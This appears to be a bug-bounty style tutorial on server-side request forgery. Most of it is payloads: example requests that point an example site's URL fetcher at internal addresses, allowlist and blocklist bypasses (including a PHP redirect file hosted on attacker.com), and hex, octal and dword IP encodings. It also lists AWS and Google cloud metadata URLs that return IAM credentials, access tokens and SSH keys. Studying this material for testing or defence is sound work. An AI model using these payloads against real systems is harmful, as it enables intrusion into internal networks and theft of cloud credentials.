SSRFs are becoming scarce and companies are implementing strict mitigations against it however it can be bypasses to achive a successful attack..

SSRFs usually occur when the server fetches something from the backend like image,file,db etc
Once youâ€™ve identified the potentially vulnerable endpoints, provide internal
addresses as the URL inputs to these endpoints : : localhost, 127.0.0.1, 0.0.0.0, 192.168.0.1, and 10.0.0.1.

POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://192.168.0.1

https://public.example.com/proxy?url=https://192.168.0.1

The easiest way of detecting blind SSRFs is through out-of-band techniques isyou make the target send requests to an external server that you
control, and then monitor your server logs for requests from the target.
or turn your machine into a server using netcat and make a webserver with ngrok or so services

Bypasses

Bypass allowlists
These can be usually bypassed if you find an open redirection vulnerability
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1

POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://127.0.0.1/pics.example.com

Bypass blocklists
https://public.example.com/proxy?url=https://attacker.com/ssrf
Then, on your server at https://attacker.com/ssrf, you can host a file with
the following content:
<?php header("location: http://127.0.0.1"); ?>

Using a ipv6 address

Encoding
https://public.example.com/proxy?url=https://0x7f.0x0.0x0.0x1 --> hex encoding
https://public.example.com/proxy?url=https://0177.0.0.01 --> octal encoding
https://public.example.com/proxy?url=https://2130706433 --> dword format

IMPACT
perform a port scanning

pull instance metadata using ip-
http://169.254.169.254/latest/meta-data/

https://public.example.com/proxy?url=http://169.254.169.254/latest/meta-data/

htttp://169.254.169.254/latest/meta-data/ returns the list of available meta-
data that you can query.
http://169.254.169.254/latest/meta-data/local-hostname/ returns the internal
hostname used by the host.
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
_NAME returns the security credentials of that role.
http://169.254.169.254/latest/dynamic/instance-identity/document/ reveals
the private IP address of the current instance.
http://169.254.169.254/latest/user-data/ returns user data on the current
instance.

You can find the complete documentation for the API endpoint at https://
docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html.

Google metadata
if detected these headers
Metadata-Flavor: Google
X-Google-Metadata-Request: True

http://metadata.google.internal/computeMetadata/v1beta1/instance/service-
accounts/default/token returns the access token of the default account on
the instance.
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/
ssh-keys returns SSH keys that can connect to other instances in this
project



